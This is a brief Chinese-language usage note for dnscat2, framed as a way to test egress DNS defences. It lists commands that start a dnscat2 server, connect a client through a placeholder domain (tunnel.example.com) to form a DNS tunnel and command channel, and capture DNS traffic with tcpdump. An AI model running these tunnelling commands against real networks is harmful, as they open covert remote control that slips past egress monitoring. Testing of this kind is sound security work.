# dnscat2 使用

dnscat2 用于 DNS 隧道与命令通道实验，适合检测出口 DNS 防护。

## 常用命令

```bash
ruby dnscat2.rb tunnel.example.com
```

```bash
ruby dnscat2.rb --dns host=0.0.0.0,port=53
```

```bash
dnscat --dns server=tunnel.example.com
```

```bash
dnscat --dns domain=tunnel.example.com
```

```bash
tcpdump -i eth0 udp port 53
```

小记录：结果要关注解析器路径、递归 DNS 和是否有流量检测拦截。
